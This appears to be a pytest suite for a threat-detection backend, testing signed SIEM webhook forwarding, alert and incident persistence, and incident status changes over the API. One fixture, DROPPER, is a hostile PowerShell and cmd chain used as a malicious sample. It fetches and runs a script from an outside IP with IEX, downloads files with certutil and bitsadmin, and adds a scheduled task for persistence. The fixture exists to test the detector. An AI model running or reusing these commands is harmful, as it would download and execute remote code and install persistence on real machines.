"""Milestone 4: SIEM/SOAR forwarding, alert/incident persistence and incident management."""

import hashlib
import hmac
import io
import json
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from app.core.config import settings
from app.main import app
from app.modules.alerts.service import AlertsService
from app.modules.file_analysis.schemas import MLPrediction
from app.modules.file_analysis.service import file_analysis_service
from app.modules.integrations.siem import SiemForwarder
from app.modules.pipeline.fusion import fuse

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b & "
    b"bitsadmin /transfer j http://45.147.230.112/c c & schtasks /create /tn p /tr b"
)


def _h(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def _malicious_result(name="siem.ps1", payload=DROPPER):
    result = file_analysis_service.analyze_static_file(name, payload)
    result.verdict = fuse(result, MLPrediction(available=False))
    return result


class FakeResponse:
    def __init__(self, status_code=200):
        self.status_code = status_code


@pytest.fixture
def siem_on(monkeypatch):
    monkeypatch.setattr(settings, "SIEM_WEBHOOK_URL", "https://siem.example.com/collect")
    monkeypatch.setattr(settings, "SIEM_WEBHOOK_TOKEN", "tok-123")
    monkeypatch.setattr(settings, "SIEM_WEBHOOK_SECRET", "shhh")


# --- webhook delivery -------------------------------------------------------------

def test_events_are_signed_and_authenticated(monkeypatch, siem_on):
    sent = {}

    def fake_post(url, data, headers, timeout):
        sent.update(url=url, data=data, headers=headers, timeout=timeout)
        return FakeResponse(202)

    monkeypatch.setattr("app.modules.integrations.siem.requests.post", fake_post)
    fwd = SiemForwarder()
    assert fwd.forward("alert.created", {"alert_id": "a1"}, severity="critical", background=False)

    assert sent["url"] == "https://siem.example.com/collect"
    assert sent["headers"]["Authorization"] == "Bearer tok-123"
    expected = "sha256=" + hmac.new(b"shhh", sent["data"], hashlib.sha256).hexdigest()
    assert sent["headers"]["X-ThreatLens-Signature"] == expected
    event = json.loads(sent["data"])
    assert event["source"] == "threatlens-ai"
    assert event["event_type"] == "alert.created"
    assert event["severity"] == "critical"
    assert event["data"] == {"alert_id": "a1"}
    status = fwd.status()
    assert status["sent"] == 1 and status["failed"] == 0 and status["last_status"] == 202


def test_delivery_failures_are_recorded_never_raised(monkeypatch, siem_on):
    def boom(*a, **k):
        raise ConnectionError("receiver down")

    monkeypatch.setattr("app.modules.integrations.siem.requests.post", boom)
    fwd = SiemForwarder()
    assert fwd.forward("alert.created", {}, background=False) is False
    status = fwd.status()
    assert status["failed"] == 1 and "receiver down" in status["last_error"]

    monkeypatch.setattr(
        "app.modules.integrations.siem.requests.post", lambda *a, **k: FakeResponse(500)
    )
    fwd.forward("alert.created", {}, background=False)
    assert fwd.status()["last_error"] == "HTTP 500"


def test_nothing_is_sent_when_unconfigured(monkeypatch):
    monkeypatch.setattr(settings, "SIEM_WEBHOOK_URL", "")
    called = []
    monkeypatch.setattr("app.modules.integrations.siem.requests.post", lambda *a, **k: called.append(1))
    assert SiemForwarder().forward("alert.created", {}) is False
    assert called == []


def test_admin_can_send_a_test_event(monkeypatch, siem_on):
    monkeypatch.setattr(
        "app.modules.integrations.siem.requests.post", lambda *a, **k: FakeResponse(200)
    )
    resp = client.post("/api/v1/admin/integrations/siem/test", headers=_h("admin@local"))
    assert resp.status_code == 200 and resp.json() == {"ok": True, "error": None}
    siem = next(i for i in client.get("/api/v1/admin/integrations", headers=_h("admin@local")).json() if i["id"] == "siem")
    assert siem["configured"] is True and siem["destination"] == "siem.example.com"
    assert "tok-123" not in json.dumps(siem) and "shhh" not in json.dumps(siem)


def test_alert_lifecycle_is_forwarded_to_the_siem(monkeypatch):
    events = []
    monkeypatch.setattr(
        "app.modules.alerts.service.siem_forwarder.forward",
        lambda event_type, data, severity=None, background=True: events.append((event_type, data, severity)),
    )
    svc = AlertsService()
    alert = svc.evaluate(_malicious_result("fwd.ps1"))
    svc.set_status(alert.id, "acknowledged")
    incident = svc.create_incident([alert.id], "Campaign Z")
    svc.update_incident(incident.id, "closed")

    assert [e[0] for e in events] == [
        "alert.created", "alert.status_changed", "incident.created", "incident.updated",
    ]
    created = events[0][1]
    assert created["sample_sha256"] == alert.sample_sha256 and created["verdict"] == "malicious"
    assert events[0][2] in ("high", "critical")


# --- persistence ------------------------------------------------------------------

class FakeRepo:
    def __init__(self, fail_if_linked=False):
        self.rows = {}
        self.fail_if_linked = fail_if_linked

    def upsert(self, row):
        if self.fail_if_linked and row.get("detection_id"):
            raise RuntimeError("foreign key violation")
        self.rows[row["id"]] = dict(row)
        return row

    def list(self, limit=1000):
        return list(reversed(list(self.rows.values())))


@pytest.fixture
def supabase_on(monkeypatch):
    monkeypatch.setattr(
        "app.modules.alerts.service.settings",
        SimpleNamespace(supabase_configured=True, smtp_configured=False),
    )


def _service(alert_repo, incident_repo):
    svc = AlertsService()
    svc._alert_repo, svc._incident_repo = alert_repo, incident_repo
    return svc


def test_alerts_and_incidents_survive_a_restart(supabase_on):
    alerts, incidents = FakeRepo(), FakeRepo()
    svc = _service(alerts, incidents)

    alert = svc.evaluate(_malicious_result("persist.ps1"), detection_id="det-1", actor="user-1")
    row = alerts.rows[alert.id]
    assert row["status"] == "open" and row["agreement"] == "rules-only"
    assert row["sample_sha256"] == alert.sample_sha256 and row["detection_id"] == "det-1"

    svc.set_status(alert.id, "resolved", note="false alarm")
    assert alerts.rows[alert.id]["status"] == "resolved"
    assert alerts.rows[alert.id]["resolved_at"] is not None
    assert alerts.rows[alert.id]["note"] == "false alarm"

    incident = svc.create_incident([alert.id], "Persisted incident")
    svc.update_incident(incident.id, "contained")
    assert incidents.rows[incident.id]["status"] == "contained"
    assert alerts.rows[alert.id]["incident_id"] == incident.id

    # a brand-new process: nothing in memory, everything reloaded from the database
    reborn = _service(alerts, incidents)
    loaded = reborn.list_alerts()
    assert [a.id for a in loaded] == [alert.id]
    assert loaded[0].status == "resolved" and loaded[0].incident_id == incident.id
    restored = reborn.list_incidents()
    assert [i.id for i in restored] == [incident.id]
    assert restored[0].status == "contained" and restored[0].alert_ids == [alert.id]
    assert reborn.stats().resolved == 1


def test_a_database_failure_never_blocks_alerting(supabase_on):
    class Broken:
        def upsert(self, row):
            raise RuntimeError("db down")

        def list(self, limit=1000):
            raise RuntimeError("db down")

    svc = _service(Broken(), Broken())
    alert = svc.evaluate(_malicious_result("offline.ps1"))
    assert alert is not None and svc.get(alert.id) is alert
    assert svc.set_status(alert.id, "acknowledged").status == "acknowledged"
    assert svc.create_incident([alert.id], None) is not None


def test_alert_is_saved_unlinked_if_the_detection_row_is_missing(supabase_on):
    alerts = FakeRepo(fail_if_linked=True)
    svc = _service(alerts, FakeRepo())
    alert = svc.evaluate(_malicious_result("fk.ps1"), detection_id="missing", actor="u")
    saved = alerts.rows[alert.id]
    assert saved["detection_id"] is None and saved["created_by"] is None


def test_alert_threshold_policy_is_respected():
    from app.core.runtime_settings import runtime_settings

    svc = AlertsService()
    clean = file_analysis_service.analyze_static_file("n.txt", b"hello, this is a plain and boring text file")
    clean.verdict = fuse(clean, MLPrediction(available=False))
    try:
        assert svc.evaluate(clean) is None
        runtime_settings.update({"ALERT_MIN_LEVEL": "low"})
        assert svc.evaluate(clean) is not None  # lowering the threshold raises alerts for low verdicts
    finally:
        runtime_settings.reset()


# --- incident management over the API ------------------------------------------------

def test_incidents_can_be_tracked_to_closure():
    analyst, soc = _h("analyst@local"), _h("soc@local")
    scan = client.post(
        "/api/v1/files/upload",
        files={"file": ("incident-flow.bin", io.BytesIO(DROPPER + b" incident-flow"), "application/octet-stream")},
        headers=analyst,
    ).json()
    alert = next(a for a in client.get("/api/v1/alerts/", headers=soc).json() if a["sample_sha256"] == scan["sha256"])

    created = client.post(
        "/api/v1/alerts/incidents", json={"alert_ids": [alert["id"]], "title": "Track me"}, headers=soc
    )
    assert created.status_code == 201
    incident_id = created.json()["id"]
    assert created.json()["closed_at"] is None

    contained = client.patch(f"/api/v1/alerts/incidents/{incident_id}", json={"status": "contained"}, headers=soc)
    assert contained.status_code == 200 and contained.json()["status"] == "contained"
    closed = client.patch(f"/api/v1/alerts/incidents/{incident_id}", json={"status": "closed"}, headers=analyst)
    assert closed.json()["status"] == "closed" and closed.json()["closed_at"] is not None
    reopened = client.patch(f"/api/v1/alerts/incidents/{incident_id}", json={"status": "open"}, headers=soc)
    assert reopened.json()["closed_at"] is None

    listed = {i["id"]: i for i in client.get("/api/v1/alerts/incidents", headers=soc).json()}
    assert listed[incident_id]["status"] == "open"

    assert client.patch(f"/api/v1/alerts/incidents/{incident_id}", json={"status": "bogus"}, headers=soc).status_code == 422
    assert client.patch("/api/v1/alerts/incidents/nope", json={"status": "closed"}, headers=soc).status_code == 404
    assert client.patch(
        f"/api/v1/alerts/incidents/{incident_id}", json={"status": "closed"}, headers=_h("researcher@local")
    ).status_code == 403

    actions = [e["action"] for e in client.get("/api/v1/admin/audit", params={"limit": 500}, headers=_h("admin@local")).json()]
    assert "incident.create" in actions and "incident.update" in actions
